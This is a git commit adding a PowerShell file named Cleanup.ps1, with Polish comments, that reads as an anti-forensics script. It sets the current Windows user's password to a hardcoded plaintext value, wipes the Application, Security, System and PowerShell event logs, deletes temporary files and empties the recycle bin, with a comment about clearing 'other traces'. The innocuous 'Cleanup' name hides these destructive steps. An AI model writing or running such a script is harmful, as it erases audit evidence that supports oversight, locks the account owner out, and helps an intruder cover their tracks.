d71b4f176fa74f8a22e5311680e2067d540f9f2a
NikodemM <ola1091331@gmail.com>
2025-08-12 13:12:43 +0200

    Create Cleanup.ps1

---
+++ Cleanup.ps1
@@ -0,0 +1,14 @@
+# Bezpieczna zmiana hasła
+$newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
+Set-LocalUser -Name $user -Password $newPassword
+
+# Czyszczenie dzienników
+$logTypes = @('Application', 'Security', 'System', 'Windows PowerShell')
+foreach ($log in $logTypes) {
+    wevtutil cl $log
+}
+
+# Czyszczenie innych śladów
+Remove-Item -Path "$env:TEMP\*" -Recurse -Force
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
